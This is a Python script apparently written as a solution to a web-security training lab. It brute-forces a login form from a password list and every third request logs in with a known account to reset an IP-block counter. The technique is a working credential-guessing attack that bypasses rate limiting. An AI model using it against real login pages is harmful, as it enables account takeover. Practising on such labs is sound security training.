#Lab: Broken brute-force protection, IP block
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

s=requests.Session()

def main():
    try:
        url=sys.argv[1].strip()
        usernames=sys.argv[2].strip()
        passwords=sys.argv[3].strip()
    except IndexError:
        print("[-] Missing Parameters usage python %s <url>"%sys.argv[0])
        sys.exit()
    
    valid_user=usernames
    
    print("[+] Enumerating Password : ")
    valid_pass=enum_password(s,url,valid_user,passwords)
    
    if(valid_pass):
        print("[+] Found valid password : "+str(valid_pass))
        if(valid_user and valid_pass):
            print("[+] Found Valid Credentials "+valid_user+" : "+valid_pass)
    
def enum_password(s,url,valid_user,passwords):
    s.get(url,verify=False,proxies=proxies)
    i=1
    try :
        with open(passwords) as password:

            for passwd in password:
                passwd=passwd.strip()
                if(i%3==0):
                    data={'username':'wiener','password':'peter'}
                else:
                    data={'username':valid_user,'password':passwd}
                print("[*] Attempt : "+str(i)+" creds : "+data['username']+":"+data['password'])
                r=s.post(url+"login",proxies=proxies,verify=False,data=data,allow_redirects=False)
                
                if(int(r.status_code)==302 and i%3!=0):
                    break
                i=i+1
            return passwd
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt,Quitting the Program")
        sys.exit()
    except :
        print("[-] Invalid Users file ")
        sys.exit(0)
if __name__=='__main__':
    main()


